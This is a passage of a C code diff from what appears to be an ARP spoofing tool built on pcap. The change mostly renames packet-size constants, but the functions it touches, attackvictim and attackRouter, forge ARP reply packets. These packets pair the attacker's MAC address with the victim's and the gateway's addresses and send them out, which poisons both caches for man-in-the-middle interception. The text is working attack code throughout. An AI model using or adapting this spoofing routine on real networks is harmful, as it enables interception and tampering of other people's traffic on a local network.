@@ -6,12 +6,12 @@ int setArpHeader(PARP_HEADER arpHeader)
 	arpHeader->Protocol_type = ntohs(0x0800);
 	arpHeader->Hardware_size = 0x06;
 	arpHeader->Protocol_size = 0x04;
-	arpHeader->Opcode = ntohs(0x0002); // reply
+	arpHeader->Opcode = ntohs(REPLY); // reply
 	return 0;
 }
 int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 {
-	u_char packet[ARPSIZE + ETHERNETSIZE];
+	u_char packet[ARP_PACKET_SIZE];
 	/* set header */
 	memcpy(arpPacket->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
@@ -20,10 +20,10 @@ int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 	memcpy(arpPacket->arp.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->arp.dst_IP, &LanInfo->victimIP, sizeof(IN_ADDR));
 	/* fill Pacekt */
-	memcpy(packet, &(arpPacket->ethernet), sizeof(char) * ETHERNETSIZE);
-	memcpy(packet + ETHERNETSIZE, &(arpPacket->arp), sizeof(char) * ARPSIZE);
+	memcpy(packet, &(arpPacket->ethernet), sizeof(u_char) * ETHERNET_SIZE);
+	memcpy(packet + ETHERNET_SIZE, &(arpPacket->arp), sizeof(u_char) * ARP_SIZE);
 	/* send to victim */
-	if (pcap_sendpacket(handle, packet, ARPSIZE + ETHERNETSIZE) != 0)
+	if (pcap_sendpacket(handle, packet, ARP_PACKET_SIZE) != 0)
 	{
 		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
 		return 0;
@@ -32,7 +32,7 @@ int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 }
 int attackRouter(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 {
-	u_char packet[ARPSIZE + ETHERNETSIZE];
+	u_char packet[ARP_PACKET_SIZE];
 	/* set header */
 	memcpy(arpPacket->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
@@ -41,10 +41,10 @@ int attackRouter(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 	memcpy(arpPacket->arp.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->arp.dst_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));
 	/* fill Pacekt */
-	memcpy(packet, &(arpPacket->ethernet), sizeof(char) * ETHERNETSIZE);
-	memcpy(packet + ETHERNETSIZE, &(arpPacket->arp), sizeof(char) * ARPSIZE);
+	memcpy(packet, &(arpPacket->ethernet), sizeof(u_char) * ETHERNET_SIZE);
+	memcpy(packet + ETHERNET_SIZE, &(arpPacket->arp), sizeof(u_char) * ARP_SIZE);
 	/* send to router */
-	if (pcap_sendpacket(handle, packet, ARPSIZE + ETHERNETSIZE) != 0)
+	if (pcap_sendpacket(handle, packet, ARP_PACKET_SIZE) != 0)
 	{
 		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
 		return 0;
